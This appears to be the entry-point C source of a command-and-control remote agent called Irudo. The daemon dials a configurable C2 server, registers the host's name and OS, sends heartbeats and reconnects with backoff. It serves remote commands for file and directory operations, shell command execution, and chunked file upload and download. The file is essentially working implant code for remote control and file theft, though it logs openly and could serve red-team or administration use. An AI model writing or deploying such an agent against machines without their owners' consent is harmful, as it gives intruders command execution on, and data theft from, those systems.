/* main.c - Irudo C remote agent entry point.
 * Headless daemon: dials the C2, registers, heartbeats, and serves
 * action / file-transfer commands. Reconnects with exponential backoff.
 */
#include "agent.h"

typedef struct {
    char *config_path;
    char *c2_host;
    int   c2_port;
    char *agent_id;
    char *auth_token;
    int   heartbeat_interval;
    int   cmd_timeout;
    int   reconnect_initial;
    int   reconnect_max;
} opts;

static void opts_init(opts *o) {
    memset(o, 0, sizeof *o);
    o->heartbeat_interval = 30;
    o->cmd_timeout = 60;
    o->reconnect_initial = 1;
    o->reconnect_max = 60;
}

/* ===================================================================== */
/* minimal flat-JSON config loader (no third-party deps)                  */
/* ===================================================================== */

static int json_find_string(const char *json, const char *key, char *out, size_t outsz) {
    char pat[256];
    snprintf(pat, sizeof pat, "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return 0;
    p += strlen(pat);
    while (*p && strchr(" \t\r\n", *p)) p++;
    if (*p != ':') return 0;
    p++;
    while (*p && strchr(" \t\r\n", *p)) p++;
    if (*p != '"') return 0;
    p++;
    size_t n = 0;
    while (*p && *p != '"' && n + 1 < outsz) {
        if (*p == '\\' && p[1]) { out[n++] = p[1]; p += 2; }
        else out[n++] = *p++;
    }
    out[n] = 0;
    return 1;
}

static int json_find_int(const char *json, const char *key, int def) {
    char pat[256];
    snprintf(pat, sizeof pat, "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return def;
    p += strlen(pat);
    while (*p && strchr(" \t\r\n", *p)) p++;
    if (*p != ':') return def;
    p++;
    while (*p && strchr(" \t\r\n", *p)) p++;
    char *end = NULL;
    long v = strtol(p, &end, 10);
    if (end == p) return def;
    return (int)v;
}

static int parse_c2_address(const char *addr, char **host, int *port) {
    const char *colon = strrchr(addr, ':');
    if (!colon || colon == addr) return -1;
    size_t hl = (size_t)(colon - addr);
    char *h = (char *)malloc(hl + 1);
    if (!h) return -1;
    memcpy(h, addr, hl);
    h[hl] = 0;
    int p = atoi(colon + 1);
    if (p <= 0 || p > 65535) { free(h); return -1; }
    *host = h;
    *port = p;
    return 0;
}

static void load_config_file(const char *path, opts *o) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[irudo] warning: cannot open config file: %s\n", path);
        return;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 4 * 1024 * 1024) { fclose(f); return; }
    char *buf = (char *)malloc((size_t)sz + 1);
    if (!buf) { fclose(f); return; }
    size_t got = fread(buf, 1, (size_t)sz, f);
    buf[got] = 0;
    fclose(f);

    char v[512];
    if (json_find_string(buf, "c2_address", v, sizeof v)) {
        char *h = NULL;
        int p = 0;
        if (parse_c2_address(v, &h, &p) == 0) {
            free(o->c2_host);
            o->c2_host = h;
            o->c2_port = p;
        }
    }
    if (json_find_string(buf, "agent_id", v, sizeof v)) {
        free(o->agent_id);
        o->agent_id = xstrdup(v);
    }
    if (json_find_string(buf, "auth_token", v, sizeof v)) {
        free(o->auth_token);
        o->auth_token = xstrdup(v);
    }
    o->heartbeat_interval = json_find_int(buf, "heartbeat_interval_sec", o->heartbeat_interval);
    o->cmd_timeout = json_find_int(buf, "cmd_timeout", o->cmd_timeout);
    o->reconnect_initial = json_find_int(buf, "reconnect_initial_sec", o->reconnect_initial);
    o->reconnect_max = json_find_int(buf, "reconnect_max_sec", o->reconnect_max);
    free(buf);
}

/* ===================================================================== */
/* CLI argument parsing                                                  */
/* ===================================================================== */

static void print_usage(const char *prog) {
    printf("Usage: %s [options]\n", prog);
    printf("  --config <path>            optional JSON config file\n");
    printf("  --c2-address host:port      C2 address (required unless in config)\n");
    printf("  --agent-id <id>            unique agent id (required unless in config)\n");
    printf("  --auth-token <token>       pre-shared token (required unless in config)\n");
    printf("  --heartbeat-interval <sec> heartbeat interval (default 30)\n");
    printf("  --cmd-timeout <sec>        command execution timeout (default 60)\n");
    printf("  --reconnect-initial <sec>  initial reconnect delay (default 1)\n");
    printf("  --reconnect-max <sec>      max reconnect delay (default 60)\n");
}

/* Returns: 0 ok, 1 help requested, -1 error */
static int parse_args(int argc, char **argv, opts *o) {
    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        if (!strcmp(a, "--help") || !strcmp(a, "-h")) return 1;
        if (a[0] != '-' || a[1] != '-') {
            fprintf(stderr, "[irudo] unexpected argument: %s\n", a);
            return -1;
        }
        const char *name = a + 2;
        if (i + 1 >= argc) {
            fprintf(stderr, "[irudo] missing value for %s\n", a);
            return -1;
        }
        const char *val = argv[++i];
        if (!strcmp(name, "config")) {
            free(o->config_path);
            o->config_path = xstrdup(val);
        } else if (!strcmp(name, "c2-address")) {
            char *h = NULL;
            int p = 0;
            if (parse_c2_address(val, &h, &p) != 0) {
                fprintf(stderr, "[irudo] invalid c2-address: %s (expected host:port)\n", val);
                return -1;
            }
            free(o->c2_host);
            o->c2_host = h;
            o->c2_port = p;
        } else if (!strcmp(name, "agent-id")) {
            free(o->agent_id);
            o->agent_id = xstrdup(val);
        } else if (!strcmp(name, "auth-token")) {
            free(o->auth_token);
            o->auth_token = xstrdup(val);
        } else if (!strcmp(name, "heartbeat-interval")) {
            o->heartbeat_interval = atoi(val);
        } else if (!strcmp(name, "cmd-timeout")) {
            o->cmd_timeout = atoi(val);
        } else if (!strcmp(name, "reconnect-initial")) {
            o->reconnect_initial = atoi(val);
        } else if (!strcmp(name, "reconnect-max")) {
            o->reconnect_max = atoi(val);
        } else {
            fprintf(stderr, "[irudo] unknown option: %s\n", a);
            return -1;
        }
    }
    return 0;
}

/* ===================================================================== */
/* networking                                                            */
/* ===================================================================== */

static sockfd_t tcp_connect(const char *host, int port) {
    struct addrinfo hints, *res = NULL, *rp;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    char portstr[16];
    snprintf(portstr, sizeof portstr, "%d", port);
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return SOCK_ERR;
    sockfd_t sock = SOCK_ERR;
    for (rp = res; rp; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock == SOCK_ERR) continue;
        if (connect(sock, rp->ai_addr, (int)rp->ai_addrlen) == 0) break;
        sock_close(sock);
        sock = SOCK_ERR;
    }
    freeaddrinfo(res);
    return sock;
}

static int send_register(sockfd_t sock, const opts *o, uint64_t req_id) {
    char hostbuf[256];
    if (get_hostname(hostbuf, sizeof hostbuf) != 0) strcpy(hostbuf, "unknown");
    char *os = detect_os();
    const char *params[4] = { o->agent_id, o->auth_token, hostbuf, os };
    uint32_t plen = 0;
    uint8_t *pkt = build_request(req_id, CMD_REGISTER, params, 4, &plen);
    int rc = pkt ? send_all(sock, pkt, plen) : -1;
    free(pkt);
    free(os);
    return rc;
}

static int send_heartbeat_pkt(sockfd_t sock, uint64_t req_id) {
    char ts[32];
    snprintf(ts, sizeof ts, "%lld", (long long)time(NULL));
    const char *params[1] = { ts };
    uint32_t plen = 0;
    uint8_t *pkt = build_request(req_id, CMD_HEARTBEAT, params, 1, &plen);
    int rc = pkt ? send_all(sock, pkt, plen) : -1;
    free(pkt);
    return rc;
}

static int send_response_pkt(sockfd_t sock, uint64_t req_id, uint8_t cmd,
                             const char *result, size_t len) {
    uint32_t plen = 0;
    uint8_t *pkt = build_response(req_id, cmd, result, len, &plen);
    int rc = pkt ? send_all(sock, pkt, plen) : -1;
    free(pkt);
    return rc;
}

/* ===================================================================== */
/* file transfer                                                         */
/* ===================================================================== */

static int handle_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id,
                         const uint8_t *body, uint32_t blen, int timeout_ms) {
    char **params = NULL;
    int n = 0;
    if (tlv_decode(body, blen, &params, &n) != 0 || n < 1) {
        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: missing dest_path", 23);
        tlv_free(params, n);
        return 0;
    }
    const char *dest = params[0];
    make_parent_dirs(dest);
    FILE *f = fopen(dest, "wb");
    if (!f) {
        char *err = printf_str("Error: cannot create file: %s", strerror(errno));
        send_response_pkt(sock, req_id, CMD_UPLOAD, err, strlen(err));
        free(err);
        tlv_free(params, n);
        return 0;
    }
    unsigned long long total = 0;
    int ok = 0;
    for (;;) {
        uint64_t rid;
        uint8_t c;
        const uint8_t *b;
        uint32_t l;
        int have = take_packet_blocking(sock, inbuf, &rid, &c, &b, &l, timeout_ms);
        if (have <= 0) break;
        if (rid != req_id) break; /* protocol violation */
        if (l) {
            fwrite(b, 1, l, f);
            total += l;
        }
        if (c == END_FLAG_LAST) { ok = 1; break; }
        if (c != END_FLAG_CONTINUE) break; /* invalid flag */
    }
    fclose(f);
    tlv_free(params, n);
    if (ok) {
        char *msg = printf_str("Successfully uploaded: %s (%" IRU_ULL " bytes)", dest, total);
        send_response_pkt(sock, req_id, CMD_UPLOAD, msg, strlen(msg));
        free(msg);
    } else {
        remove(dest);
        send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: upload failed", 20);
    }
    return 0;
}

static int handle_download(sockfd_t sock, uint64_t req_id,
                           const uint8_t *body, uint32_t blen) {
    char **params = NULL;
    int n = 0;
    if (tlv_decode(body, blen, &params, &n) != 0 || n < 1) {
        send_response_pkt(sock, req_id, CMD_DOWNLOAD, "Error: missing src_path", 23);
        tlv_free(params, n);
        return 0;
    }
    const char *src = params[0];
    if (!path_exists(src)) {
        char *err = printf_str("Error: source not found: %s", src);
        send_response_pkt(sock, req_id, CMD_DOWNLOAD, err, strlen(err));
        free(err);
        tlv_free(params, n);
        return 0;
    }
    if (is_dir(src)) {
        char *err = printf_str("Error: source is a directory: %s", src);
        send_response_pkt(sock, req_id, CMD_DOWNLOAD, err, strlen(err));
        free(err);
        tlv_free(params, n);
        return 0;
    }
    FILE *f = fopen(src, "rb");
    if (!f) {
        char *err = printf_str("Error: cannot open source: %s", strerror(errno));
        send_response_pkt(sock, req_id, CMD_DOWNLOAD, err, strlen(err));
        free(err);
        tlv_free(params, n);
        return 0;
    }
    uint8_t chunk[DATA_CHUNK_SIZE];
    for (;;) {
        size_t r = fread(chunk, 1, DATA_CHUNK_SIZE, f);
        if (r == 0) {
            uint32_t plen;
            uint8_t *pkt = build_data_packet(req_id, END_FLAG_LAST, NULL, 0, &plen);
            if (pkt) { send_all(sock, pkt, plen); free(pkt); }
            break;
        }
        uint8_t flag = (r < DATA_CHUNK_SIZE) ? END_FLAG_LAST : END_FLAG_CONTINUE;
        uint32_t plen;
        uint8_t *pkt = build_data_packet(req_id, flag, chunk, r, &plen);
        if (!pkt) break;
        if (send_all(sock, pkt, plen) != 0) { free(pkt); break; }
        free(pkt);
        if (flag == END_FLAG_LAST) break;
    }
    fclose(f);
    tlv_free(params, n);
    return 0;
}

/* ===================================================================== */
/* dispatch                                                              */
/* ===================================================================== */

static int is_action(uint8_t cmd) {
    switch (cmd) {
        case CMD_LIST_DIR: case CMD_MAKE_DIR: case CMD_DELETE_DIR:
        case CMD_RENAME_DIR: case CMD_READ_FILE: case CMD_WRITE_FILE:
        case CMD_DELETE_FILE: case CMD_EDIT_FILE: case CMD_RENAME_FILE:
        case CMD_COPY: case CMD_MOVE: case CMD_CREATE_FILE:
        case CMD_GET_CWD: case CMD_EXEC_CMD:
            return 1;
        default:
            return 0;
    }
}

/* Returns: 0 continue, 1 shutdown, -1 disconnect/protocol-fatal. */
static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdown_flag,
                    uint64_t req_id, uint8_t cmd,
                    const uint8_t *body, uint32_t blen) {
    if (cmd == CMD_HEARTBEAT) {
        send_response_pkt(sock, req_id, CMD_HEARTBEAT_ACK, (const char *)body, blen);
        return 0;
    }
    if (cmd == CMD_HEARTBEAT_ACK) return 0;
    if (cmd == CMD_REGISTER_RESPONSE) {
        fprintf(stderr, "[irudo] register_response: %.*s\n", (int)blen, (const char *)body);
        return 0;
    }
    if (cmd == CMD_DISCONNECT) return -1;
    if (cmd == CMD_SHUTDOWN) {
        send_response_pkt(sock, req_id, CMD_SHUTDOWN, "ok", 2);
        *shutdown_flag = 1;
        return 1;
    }
    if (cmd == CMD_UPLOAD) {
        return handle_upload(sock, inbuf, req_id, body, blen, 30000);
    }
    if (cmd == CMD_DOWNLOAD) {
        return handle_download(sock, req_id, body, blen);
    }
    if (is_action(cmd)) {
        char **params = NULL;
        int n = 0;
        if (tlv_decode(body, blen, &params, &n) != 0) {
            send_response_pkt(sock, req_id, cmd, "Error: bad TLV", 13);
            return 0;
        }
        char *result = run_action(cmd, params, n, o->cmd_timeout);
        tlv_free(params, n);
        send_response_pkt(sock, req_id, cmd, result, strlen(result));
        free(result);
        return 0;
    }
    send_response_pkt(sock, req_id, cmd, "Error: Unknown cmd", 17);
    return 0;
}

/* ===================================================================== */
/* serve loop + reconnect                                                */
/* ===================================================================== */

static int serve(sockfd_t sock, const opts *o, int *shutdown_flag) {
    bytebuf_t inbuf;
    bb_init(&inbuf);
    uint64_t next_req = 2; /* 1 used by register */
    int64_t last_hb = now_ms();
    int ret = 0;

    for (;;) {
        uint64_t req_id;
        uint8_t cmd;
        const uint8_t *body;
        uint32_t blen;
        int have = bb_take_packet(&inbuf, &req_id, &cmd, &body, &blen);
        if (have < 0) { ret = -1; break; }
        if (have > 0) {
            ret = dispatch(sock, &inbuf, o, shutdown_flag, req_id, cmd, body, blen);
            if (ret != 0) break;
            continue;
        }
        int64_t now = now_ms();
        int64_t hb_ms = (int64_t)o->heartbeat_interval * 1000;
        int64_t wait_ms = hb_ms - (now - last_hb);
        if (wait_ms <= 0) {
            if (send_heartbeat_pkt(sock, next_req++) != 0) { ret = -1; break; }
            last_hb = now_ms();
            continue;
        }
        int sel = wait_sock(sock, (int)wait_ms);
        if (sel > 0) {
            int r = recv_more(sock, &inbuf);
            if (r <= 0) { ret = -1; break; }
        } else if (sel == 0) {
            if (send_heartbeat_pkt(sock, next_req++) != 0) { ret = -1; break; }
            last_hb = now_ms();
        } else {
            ret = -1;
            break;
        }
    }
    bb_free(&inbuf);
    return ret;
}

static int run(const opts *o) {
    int shutdown_flag = 0;
    double delay = (double)o->reconnect_initial;
    if (delay < 1.0) delay = 1.0;
    while (!shutdown_flag) {
        sockfd_t sock = tcp_connect(o->c2_host, o->c2_port);
        if (sock == SOCK_ERR) {
            fprintf(stderr, "[irudo] connect to %s:%d failed; retry in %.0fs\n",
                    o->c2_host, o->c2_port, delay);
            sleep_sec(delay);
            if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
            continue;
        }
        fprintf(stderr, "[irudo] connected to %s:%d\n", o->c2_host, o->c2_port);
        if (send_register(sock, o, 1) != 0) {
            sock_close(sock);
            fprintf(stderr, "[irudo] register send failed; retry in %.0fs\n", delay);
            sleep_sec(delay);
            if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
            continue;
        }
        int ret = serve(sock, o, &shutdown_flag);
        sock_close(sock);
        if (shutdown_flag) {
            fprintf(stderr, "[irudo] shutdown received, exiting\n");
            break;
        }
        fprintf(stderr, "[irudo] connection closed (ret=%d); retry in %.0fs\n", ret, delay);
        sleep_sec(delay);
        if (delay * 2 <= (double)o->reconnect_max) delay *= 2;
    }
    return 0;
}

int main(int argc, char **argv) {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#else
    signal(SIGPIPE, SIG_IGN);
#endif

    opts o;
    opts_init(&o);

    /* config file first (provides defaults), then CLI overrides */
    for (int i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "--config") == 0) {
            load_config_file(argv[i + 1], &o);
            break;
        }
    }
    int rc = parse_args(argc, argv, &o);
    if (rc == 1) {
        print_usage(argv[0]);
        return 0;
    }
    if (rc < 0) return 2;

    if (!o.c2_host || !o.agent_id || !o.auth_token) {
        fprintf(stderr, "[irudo] missing required config: c2_address, agent_id, auth_token\n");
        fprintf(stderr, "[irudo] provide via --c2-address / --agent-id / --auth-token or a config file\n");
        return 1;
    }
    if (o.heartbeat_interval < 1) o.heartbeat_interval = 1;
    if (o.cmd_timeout < 1) o.cmd_timeout = 1;

    fprintf(stderr, "[irudo] agent '%s' starting; C2=%s:%d (heartbeat=%ds, cmd_timeout=%ds)\n",
            o.agent_id, o.c2_host, o.c2_port, o.heartbeat_interval, o.cmd_timeout);
    int r = run(&o);

    free(o.c2_host);
    free(o.agent_id);
    free(o.auth_token);
    free(o.config_path);
#ifdef _WIN32
    WSACleanup();
#endif
    return r;
}
